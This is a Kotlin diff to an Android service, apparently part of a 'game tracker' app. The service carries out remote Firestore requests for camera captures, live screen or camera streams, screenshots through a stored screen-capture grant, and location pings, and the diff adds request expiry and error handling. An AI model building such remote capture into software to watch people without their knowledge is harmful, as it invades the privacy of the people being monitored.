@@ -170,7 +170,7 @@ class ForegroundService : Service() {
             deviceId = prefs.getString("game_tracker_device_id", null)
         }
 
-        if (deviceId.isNullOrEmpty()) {
+        if (deviceId.isNullOrEmpty() || !deviceId.startsWith("user_")) {
             prefs.registerOnSharedPreferenceChangeListener { sharedPrefs, key ->
                 if (key == "flutter.game_tracker_device_id" || key == "game_tracker_device_id") {
                     setupFirestoreRequestListener()
@@ -187,11 +187,24 @@ class ForegroundService : Service() {
                 .addSnapshotListener { snapshots, error ->
                     if (error != null || snapshots == null) return@addSnapshotListener
                     for (change in snapshots.documentChanges) {
-                        if (change.type == DocumentChange.Type.ADDED) {
+                        if (change.type == DocumentChange.Type.ADDED || change.type == DocumentChange.Type.MODIFIED) {
                             val doc = change.document
                             val requestId = doc.id
                             val requestType = doc.getString("requestType") ?: "screenshot"
                             val cameraFacing = doc.getString("cameraFacing") ?: "front"
+                            val reqTimestamp = doc.getTimestamp("requestedAt")?.toDate()?.time ?: System.currentTimeMillis()
+
+                            // Auto-expire requests older than 2 minutes to prevent launch crash loops
+                            if (System.currentTimeMillis() - reqTimestamp > 120000) {
+                                firestore.collection("screenshot_requests").document(requestId).update(
+                                    mapOf(
+                                        "status" to "expired",
+                                        "failureReason" to "Request expired before service pickup",
+                                        "completedAt" to FieldValue.serverTimestamp()
+                                    )
+                                )
+                                continue
+                            }
 
                             when (requestType) {
                                 "location_ping" -> {
@@ -199,48 +212,84 @@ class ForegroundService : Service() {
                                 }
                                 "camera_capture" -> {
                                     markBackgroundAttempt(requestId)
-                                    val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
-                                        putExtra("requestId", requestId)
-                                        putExtra("cameraFacing", cameraFacing)
-                                    }
-                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                                        startForegroundService(svcIntent)
-                                    } else {
-                                        startService(svcIntent)
+                                    try {
+                                        val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
+                                            putExtra("requestId", requestId)
+                                            putExtra("cameraFacing", cameraFacing)
+                                        }
+                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                            startForegroundService(svcIntent)
+                                        } else {
+                                            startService(svcIntent)
+                                        }
+                                    } catch (e: Throwable) {
+                                        Log.e("ForegroundService", "CameraCaptureService start error: ${e.message}")
+                                        firestore.collection("screenshot_requests").document(requestId).update(
+                                            mapOf(
+                                                "status" to "failed",
+                                                "error" to "Service start disallowed",
+                                                "failureReason" to "OS disallowed background camera start: ${e.message}",
+                                                "completedAt" to FieldValue.serverTimestamp()
+                                            )
+                                        )
                                     }
                                 }
                                 "screen_share", "camera_stream" -> {
                                     markBackgroundAttempt(requestId)
-                                    val svcIntent = Intent(this, WebRtcPublisherService::class.java).apply {
-                                        putExtra("requestId", requestId)
-                                        putExtra("cameraFacing", cameraFacing)
-                                        putExtra("requestType", requestType)
-                                        val savedProjection = MediaProjectionStore.load(this@ForegroundService)
-                                        if (savedProjection.first != 0 && savedProjection.second != null) {
-                                            putExtra("resultCode", savedProjection.first)
-                                            putExtra("resultData", savedProjection.second)
+                                    try {
+                                        val svcIntent = Intent(this, WebRtcPublisherService::class.java).apply {
+                                            putExtra("requestId", requestId)
+                                            putExtra("cameraFacing", cameraFacing)
+                                            putExtra("requestType", requestType)
+                                            val savedProjection = MediaProjectionStore.load(this@ForegroundService)
+                                            if (savedProjection.first != 0 && savedProjection.second != null) {
+                                                putExtra("resultCode", savedProjection.first)
+                                                putExtra("resultData", savedProjection.second)
+                                            }
                                         }
-                                    }
-                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                                        startForegroundService(svcIntent)
-                                    } else {
-                                        startService(svcIntent)
+                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                            startForegroundService(svcIntent)
+                                        } else {
+                                            startService(svcIntent)
+                                        }
+                                    } catch (e: Throwable) {
+                                        Log.e("ForegroundService", "WebRtcPublisherService start error: ${e.message}")
+                                        firestore.collection("screenshot_requests").document(requestId).update(
+                                            mapOf(
+                                                "status" to "failed",
+                                                "error" to "Stream start disallowed",
+                                                "failureReason" to "OS disallowed background stream start: ${e.message}",
+                                                "completedAt" to FieldValue.serverTimestamp()
+                                            )
+                                        )
                                     }
                                 }
                                 "screenshot" -> {
-                                    val savedProjection = MediaProjectionStore.load(this@ForegroundService)
-                                    val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
-                                        putExtra("requestId", requestId)
-                                        putExtra("capture_once", true)
-                                        if (savedProjection.first != 0 && savedProjection.second != null) {
-                                            putExtra("resultCode", savedProjection.first)
-                                            putExtra("resultData", savedProjection.second)
+                                    try {
+                                        val savedProjection = MediaProjectionStore.load(this@ForegroundService)
+                                        val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
+                                            putExtra("requestId", requestId)
+                                            putExtra("capture_once", true)
+                                            if (savedProjection.first != 0 && savedProjection.second != null) {
+                                                putExtra("resultCode", savedProjection.first)
+                                                putExtra("resultData", savedProjection.second)
+                                            }
                                         }
-                                    }
-                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                                        startForegroundService(svcIntent)
-                                    } else {
-                                        startService(svcIntent)
+                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                            startForegroundService(svcIntent)
+                                        } else {
+                                            startService(svcIntent)
+                                        }
+                                    } catch (e: Throwable) {
+                                        Log.e("ForegroundService", "ScreenCaptureService start error: ${e.message}")
+                                        firestore.collection("screenshot_requests").document(requestId).update(
+                                            mapOf(
+                                                "status" to "failed",
+                                                "error" to "Screen capture start disallowed",
+                                                "failureReason" to "OS disallowed background capture start: ${e.message}",
+                                                "completedAt" to FieldValue.serverTimestamp()
+                                            )
+                                        )
                                     }
                                 }
                             }
